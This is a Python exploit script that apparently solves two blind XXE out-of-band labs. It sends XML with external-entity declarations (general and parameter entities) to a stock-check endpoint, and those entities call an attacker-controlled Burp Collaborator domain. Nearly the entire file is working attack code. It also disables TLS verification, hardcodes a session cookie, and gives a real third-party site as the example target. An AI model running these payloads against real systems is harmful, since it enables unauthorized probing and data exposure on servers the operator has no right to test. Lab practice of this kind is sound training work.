#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse

from colorama import init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
	'Content-Type': 'application/xml',
	'Cookie': 'session=9JIQWICFGc6lYLIPkFOZ1tw3KYnx2OgX'
	}

def xxe_dnslog(url, dnslog, lab_num):
	stock_path = '/product/stock'
	product_path = '/product?productId=1'
	params = ''

	if lab_num == '3':
		params = """<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE sec [<!ENTITY xxe SYSTEM "http://xxe03.{dnslog}"> ]>
		<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>""".format(dnslog=dnslog)
	elif lab_num == '4':
		params = """<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://xxe04.{dnslog}"> %xxe; ]>
		<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>""".format(dnslog=dnslog)
	else:
		print("\033[1;31;40m[-] The lab number is invalid, please enter 3 or 4.")
		sys.exit(-1)

	req = requests.post(url + stock_path, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)
	print("\033[1;33;40m[+] Verifying if blind XXE with out-of-band exploit worked...")
	
	if(req.status_code == 504):
		print("\033[36m[-] Response: [Server Error: Gateway Timeout]")
		print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
		sys.exit(-1)
	req2 = requests.get(url + product_path, verify=False, proxies=proxies)
	if (req.status_code == 400 and 'Congratulations, you solved the lab!' in req2.text):
		print("\033[1;32;40m[+] Blind XXE with out-of-band detection successful!")
		print("\033[1;32;40m[+] Go to the Collaborator tab click \"Poll now\" get result.")
	else:
		print("\033[1;31;40m[-] Blind XXE with out-of-band detection not successful.")

def main():
	if len(sys.argv) != 4:
		print("\033[36m[+] Usage: {0} <url> <burp collaborator domain> <lab number(3 or 4)>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://www.bing.com abcdf.oastify.com 3".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	dnslog = sys.argv[2]
	lab_num = str(sys.argv[3])

	print("\033[36m[+] Checking blind XXE with out-of-band detection...")

	xxe_dnslog(url, dnslog, lab_num)


if __name__ == "__main__":
	main()
